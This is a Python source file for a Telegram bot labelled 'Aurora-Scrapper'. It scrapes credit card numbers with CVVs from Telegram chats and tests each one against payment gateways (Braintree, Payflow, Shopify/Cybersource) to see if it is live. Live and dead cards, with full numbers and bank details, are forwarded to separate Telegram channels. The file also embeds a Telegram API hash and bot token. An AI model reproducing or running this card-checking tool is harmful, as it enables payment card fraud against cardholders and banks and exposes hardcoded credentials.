from telethon.sync import TelegramClient, events
import telebot
import re, requests, time, random
from Gates import braintree_auth6x, PayflowAVS, ShopiGate

with open('responses.txt', 'r') as f:
    diclives = f.read().splitlines()

with open('keywords.txt', 'r') as f:
    keywords = f.read().splitlines()

api_id = ' 29205252'  
api_hash = 'edad1f354b8f949b6945d152e4647e6d'  
send_chat = "-1002085377652"
client = TelegramClient("anon", api_id, api_hash)
token = "7080457806:AAEBFKDwzCOTHgxAeVexl9vlXFZumEVoMu4"
bot = telebot.TeleBot(token)

async def format_card_message(message, keywords):
    card_info = re.search(r'(\d{16}\|\d{2}\|\d{4}\|\d{3})', message)
    if card_info:
        card_number, exp_month, exp_year, cvv = card_info.group(1).split('|')
        hidden_number = hidden_card_number =(card_number)
        fullinfo =  f'{card_number}|{exp_month}|{exp_year}|{cvv}'
        print(fullinfo)
       
@client.on(events.MessageEdited())
async def handler(event):
    if event.is_private:
        chat_name = 'Chat privado'
    elif event.is_group:
        chat_name = 'Grupo: {}'.format(event.chat.title)
    else:
        chat_name = 'Canal: {}'.format(event.chat.title)

    message_get = event.message.message.upper()
    regex = r'(\d{14,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'

    match = re.search(regex, message_get)

    if match:
        cc = match.group(1)
        mes = match.group(2)
        years = match.group(3)
        cvv = match.group(4)

    message_gei = re.sub(regex, r'<code>\g<0></code>', message_get)
    payload = {
        'chat_id': '-1002122873053',
        'text': message_gei,
        'parse_mode': 'HTML'
    }

    if re.search(regex, message_get):
        match = re.search(regex, message_get)
        card_info = match.group(0)
        keyword_found = None

        for keyword in keywords:
            if keyword.lower() in message_get.lower():
                keyword_found = keyword
                break

        if keyword_found:
            start = time.time()
            print(f'{cc}|{mes}|{years}|{cvv}')

            rs = requests.get(f"https://bins.antipublic.cc/bins/{card_info[:6]}").json()
            
            brand = rs["brand"]
            types = rs["type"]
            level = rs["level"]
            bank = rs["bank"]
            country = rs["country_name"]
            flag = rs["country_flag"]

            #Importa los gates de la carpeta Gates y elige uno al azar
            gates = [braintree_auth6x, PayflowAVS, ShopiGate]
            gate_random = random.choice(gates)
            print("Usando gate: ", gate_random)
            result = await(gate_random(cc, mes, years, cvv))
            print(result)

            #Asigna un nombre al gate
            if gate_random == braintree_auth6x:
                gatewayname = 'Braintree+PayJunction Auth'
            elif gate_random == PayflowAVS:
                gatewayname = 'Payflow'
            elif gate_random == ShopiGate:
                gatewayname = 'Shopify + Cybersource'
        
            if result in diclives:
                print('Resultado en dicct')
                textg = f"""<b><i>Aurora-Scrapper</i></b>
[#Bin{card_info[:6]}] 
<b>Cc -></b> <code>{card_info}</code>
<b>Response -></b> <code>{result} ✅</code>
<b>Gateway -></b> <b>{gatewayname}</b>
<b>Extra -></b> <code>{cc[:12]}xxxx|{mes}|{years}|rnd</code>
<b>Bank -></b> <code>{bank}</code>
<b>Info -></b> <code>{level}</code> - <code>{types}</code> - <code>{brand}</code> <code>{country}</code> <code>[{flag}]</code>"""
                bot.send_message(send_chat, textg, parse_mode='html')
            else:
                deadsChannel = "-4136060565"
                text2 = f"""<b><i>Aurora-Scrapper[Deads]</i></b>
[#Bin{card_info[:6]}] 
<b>Cc -></b> <code>{card_info}</code>
<b>Response -></b> <code>{result} ❌</code>
<b>Gateway -></b> <b>{gatewayname}</b>
<b>Extra -></b> <code>{cc[:12]}xxxx|{mes}|{years}|rnd</code>
<b>Bank -></b> <code>{bank}</code>
<b>Info -></b> <code>{level}</code> - <code>{types}</code> - <code>{brand}</code> <code>{country}</code> <code>[{flag}]</code>
"""
                bot.send_message(deadsChannel, text2, parse_mode='html')

client.start()       
client.run_until_disconnected()          
            